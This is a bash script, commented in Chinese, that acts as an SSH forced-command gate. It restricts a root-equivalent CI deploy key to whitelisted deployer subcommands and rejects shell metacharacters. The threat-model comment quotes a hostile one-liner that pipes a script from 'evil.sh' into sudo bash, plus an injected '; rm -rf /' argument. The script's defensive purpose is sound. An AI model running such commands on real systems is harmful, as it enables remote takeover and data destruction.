#!/usr/bin/env bash
# ssh-gate.sh — CI 部署密钥的 forced command 闸门
#
# 为什么需要它：
#   CI 用 DEPLOY_SSH_KEY 以 `ubuntu` 登录，而 ubuntu 是 `NOPASSWD: ALL` ——
#   这把密钥**等价 root**。密钥存在 GitHub Secret 里，任何能改 workflow 的人
#   （或一次供应链投毒）拿到它就能 `ssh target 'curl evil.sh | sudo bash'`。
#
# 做法：给这把公钥的 authorized_keys 行加 `command="/opt/deploy/bin/ssh-gate.sh"`。
#   之后无论客户端请求什么，sshd 都只执行本脚本，原命令放在 $SSH_ORIGINAL_COMMAND。
#   本脚本只放行「调用部署器的白名单子命令」，其余一律拒绝（exit 126）。
#   人工密钥（liuqiang@hxym）不受影响，仍是完整 shell。
#
# 设计约束：
#   · **不做 shell 解析**：只按空白切分后 exec 部署器。传 `; rm -rf /` 也只是一个普通参数。
#   · 显式拒绝 shell 元字符，避免以后有人加子命令时把 `eval` 引回来。
set -uo pipefail

DEPLOY_ROOT="${DEPLOY_ROOT:-/opt/deploy}"
DEPLOY_BIN="$DEPLOY_ROOT/bin/deploy.sh"
ALLOWED="deploy rollback status verify selfcheck excludes backup ping where list"

raw="${SSH_ORIGINAL_COMMAND:-}"

deny() {
  echo "ssh-gate: $*" >&2
  echo "ssh-gate: 这把密钥只用于部署；人工运维请用你自己的密钥登录。" >&2
  exit 126
}

[[ -z "$raw" ]] && deny "不提供交互式 shell"

# 只接受「… deploy.sh [子命令 [参数…]]」这一种形状（允许前面带 sudo -n，兼容旧 workflow）
case "$raw" in
  *"deploy.sh") sub="" ;;
  *"deploy.sh "*) sub="${raw#*deploy.sh }" ;;
  *) deny "只允许调用部署器（收到：${raw:0:80}）" ;;
esac

# shell 元字符一律拒绝：白名单之外不该出现管道 / 重定向 / 命令替换
case "$raw" in
  *[';|&`$<>(){}']*) deny "命令行里不允许 shell 元字符" ;;
esac

subcmd="${sub%% *}"
rest=""
[[ "$sub" != "$subcmd" ]] && rest="${sub#* }"

if [[ -z "$subcmd" ]]; then
  exec sudo -n "$DEPLOY_BIN" # 无参数 → 打印用法
fi

case " $ALLOWED " in
  *" $subcmd "*) ;;
  *) deny "不允许的子命令 '$subcmd'（可用：$ALLOWED）" ;;
esac

# shellcheck disable=SC2086  # rest 必须按空白切成多个参数；全程无 eval，故无注入面
exec sudo -n "$DEPLOY_BIN" "$subcmd" $rest
